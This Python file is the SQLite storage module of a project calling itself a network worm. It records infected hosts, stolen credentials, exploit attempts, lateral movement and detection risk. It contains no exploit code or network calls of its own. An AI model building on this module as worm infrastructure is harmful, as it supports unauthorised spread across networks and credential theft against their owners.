"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
SQLite Database Module
Persistent storage for worm operations: hosts, credentials, activities, exploits
"""

import json
import os
import sqlite3
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class WormDatabase:
    """
    SQLite database for persistent worm state

    Tables:
    - hosts: Discovered and infected hosts
    - credentials: Discovered credentials
    - activities: Activity log
    - exploits: Exploit attempts and results
    - lateral_movements: Lateral movement history
    - vulnerabilities: Discovered vulnerabilities
    - config: Configuration and metadata
    """

    def __init__(self, db_path: str = "wormy.db"):
        self.db_path = db_path
        self.conn = None
        self._lock = threading.Lock()
        self._init_db()

    def _init_db(self):
        """Initialize database and create tables"""
        os.makedirs(os.path.dirname(os.path.abspath(self.db_path)), exist_ok=True)
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row

        with self._lock:
            cursor = self.conn.cursor()
            cursor.executescript("""
                CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE NOT NULL,
                os_guess TEXT DEFAULT 'Unknown',
                status TEXT DEFAULT 'discovered',
                open_ports TEXT DEFAULT '[]',
                services TEXT DEFAULT '{}',
                vulnerability_score INTEGER DEFAULT 0,
                health REAL DEFAULT 100.0,
                detection_risk REAL DEFAULT 0.0,
                payload_variant TEXT DEFAULT '',
                infected_at TEXT,
                last_beacon TEXT,
                created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                updated_at TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_ip TEXT NOT NULL,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                service TEXT DEFAULT 'unknown',
                source TEXT DEFAULT 'unknown',
                discovered_at TEXT DEFAULT CURRENT_TIMESTAMP,
                UNIQUE(host_ip, username, password, service)
            );

            CREATE TABLE IF NOT EXISTS activities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_ip TEXT,
                activity_type TEXT NOT NULL,
                details TEXT,
                data TEXT DEFAULT '{}',
                timestamp TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS exploits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_ip TEXT NOT NULL,
                exploit_name TEXT NOT NULL,
                success INTEGER DEFAULT 0,
                result TEXT DEFAULT '{}',
                executed_at TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS lateral_movements (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                source_ip TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                technique TEXT NOT NULL,
                success INTEGER DEFAULT 0,
                executed_at TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_ip TEXT NOT NULL,
                cve TEXT DEFAULT 'N/A',
                name TEXT NOT NULL,
                severity TEXT DEFAULT 'UNKNOWN',
                cvss REAL DEFAULT 0.0,
                description TEXT,
                discovered_at TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS config (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL,
                updated_at TEXT DEFAULT CURRENT_TIMESTAMP
            );

            CREATE INDEX IF NOT EXISTS idx_hosts_status ON hosts(status);
            CREATE INDEX IF NOT EXISTS idx_creds_host ON credentials(host_ip);
            CREATE INDEX IF NOT EXISTS idx_activities_type ON activities(activity_type);
            CREATE INDEX IF NOT EXISTS idx_exploits_target ON exploits(target_ip);
        """)

            self.conn.commit()
        logger.info(f"Database initialized: {self.db_path}")

    def upsert_host(
        self,
        ip: str,
        os_guess: str = "Unknown",
        status: str = "discovered",
        open_ports: List[int] = None,
        services: Dict = None,
        vulnerability_score: int = 0,
        payload_variant: str = "",
    ):
        """Insert or update a host"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                INSERT INTO hosts (ip, os_guess, status, open_ports, services, vulnerability_score, payload_variant, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
                ON CONFLICT(ip) DO UPDATE SET
                    os_guess=excluded.os_guess,
                    status=excluded.status,
                    open_ports=excluded.open_ports,
                    services=excluded.services,
                    vulnerability_score=excluded.vulnerability_score,
                    payload_variant=excluded.payload_variant,
                    updated_at=CURRENT_TIMESTAMP
            """,
                (
                    ip,
                    os_guess,
                    status,
                    json.dumps(open_ports or []),
                    json.dumps(services or {}),
                    vulnerability_score,
                    payload_variant,
                ),
            )
            self.conn.commit()

    def update_host_status(
        self, ip: str, status: str, health: float = None, detection_risk: float = None
    ):
        """Update host status and metrics"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                UPDATE hosts SET status=?, health=?, detection_risk=?, updated_at=CURRENT_TIMESTAMP
                WHERE ip=?
            """,
                (status, health, detection_risk, ip),
            )
            self.conn.commit()

    def mark_infected(self, ip: str, payload_variant: str = ""):
        """Mark host as infected"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                UPDATE hosts SET status='infected', payload_variant=?, infected_at=CURRENT_TIMESTAMP, updated_at=CURRENT_TIMESTAMP
                WHERE ip=?
            """,
                (payload_variant, ip),
            )
            self.conn.commit()

    def add_credential(
        self,
        host_ip: str,
        username: str,
        password: str,
        service: str = "unknown",
        source: str = "unknown",
    ):
        """Add discovered credential"""
        with self._lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute(
                    """
                    INSERT OR IGNORE INTO credentials (host_ip, username, password, service, source)
                    VALUES (?, ?, ?, ?, ?)
                """,
                    (host_ip, username, password, service, source),
                )
                self.conn.commit()
            except Exception:
                pass

    def add_activity(self, host_ip: str, activity_type: str, details: str, data: Dict = None):
        """Add activity log entry"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                INSERT INTO activities (host_ip, activity_type, details, data)
                VALUES (?, ?, ?, ?)
            """,
                (host_ip, activity_type, details, json.dumps(data or {})),
            )
            self.conn.commit()

    def add_exploit(self, target_ip: str, exploit_name: str, success: bool, result: Dict = None):
        """Record exploit attempt"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                INSERT INTO exploits (target_ip, exploit_name, success, result)
                VALUES (?, ?, ?, ?)
            """,
                (target_ip, exploit_name, 1 if success else 0, json.dumps(result or {})),
            )
            self.conn.commit()

    def add_lateral_movement(self, source_ip: str, target_ip: str, technique: str, success: bool):
        """Record lateral movement"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                INSERT INTO lateral_movements (source_ip, target_ip, technique, success)
                VALUES (?, ?, ?, ?)
            """,
                (source_ip, target_ip, technique, 1 if success else 0),
            )
            self.conn.commit()

    def add_vulnerability(
        self, host_ip: str, cve: str, name: str, severity: str, cvss: float, description: str = ""
    ):
        """Record vulnerability"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute(
                """
                INSERT INTO vulnerabilities (host_ip, cve, name, severity, cvss, description)
                VALUES (?, ?, ?, ?, ?, ?)
            """,
                (host_ip, cve, name, severity, cvss, description),
            )
            self.conn.commit()

    def get_hosts(self, status: str = None) -> List[Dict]:
        """Get hosts, optionally filtered by status"""
        with self._lock:
            cursor = self.conn.cursor()
            if status:
                cursor.execute("SELECT * FROM hosts WHERE status=?", (status,))
            else:
                cursor.execute("SELECT * FROM hosts ORDER BY created_at DESC")
            rows = cursor.fetchall()
            return [dict(r) for r in rows]

    def get_credentials(self, host_ip: str = None) -> List[Dict]:
        """Get credentials, optionally filtered by host"""
        with self._lock:
            cursor = self.conn.cursor()
            if host_ip:
                cursor.execute("SELECT * FROM credentials WHERE host_ip=?", (host_ip,))
            else:
                cursor.execute("SELECT * FROM credentials ORDER BY discovered_at DESC")
            return [dict(r) for r in cursor.fetchall()]

    def get_activities(self, limit: int = 100) -> List[Dict]:
        """Get recent activities"""
        with self._lock:
            cursor = self.conn.cursor()
            cursor.execute("SELECT * FROM activities ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(r) for r in cursor.fetchall()]

    _ALLOWED_TABLES = frozenset(
        {"hosts", "credentials", "activities", "exploits", "lateral_movements", "vulnerabilities"}
    )

    def _safe_table(self, name: str) -> str:
        if name not in self._ALLOWED_TABLES:
            raise ValueError(f"Unknown table: {name}")
        return name

    def get_statistics(self) -> Dict:
        """Get database statistics"""
        with self._lock:
            cursor = self.conn.cursor()
            stats = {}
            for table in self._ALLOWED_TABLES:
                cursor.execute(f"SELECT COUNT(*) as count FROM {self._safe_table(table)}")
                stats[table] = cursor.fetchone()["count"]

            cursor.execute("SELECT COUNT(*) as count FROM hosts WHERE status='infected'")
            stats["infected_hosts"] = cursor.fetchone()["count"]

            cursor.execute("SELECT AVG(vulnerability_score) as avg_score FROM hosts")
            row = cursor.fetchone()
            stats["avg_vulnerability_score"] = row["avg_score"] if row["avg_score"] else 0

            return stats

    def export_json(self, filepath: str):
        """Export entire database to JSON"""
        data = {}
        with self._lock:
            cursor = self.conn.cursor()
            for table in self._ALLOWED_TABLES:
                cursor.execute(f"SELECT * FROM {self._safe_table(table)}")
                data[table] = [dict(r) for r in cursor.fetchall()]
        with open(filepath, "w") as f:
            json.dump(data, f, indent=2, default=str)
        logger.info(f"Database exported to {filepath}")

    def close(self):
        """Close database connection"""
        with self._lock:
            if self.conn:
                self.conn.close()
            self.conn = None
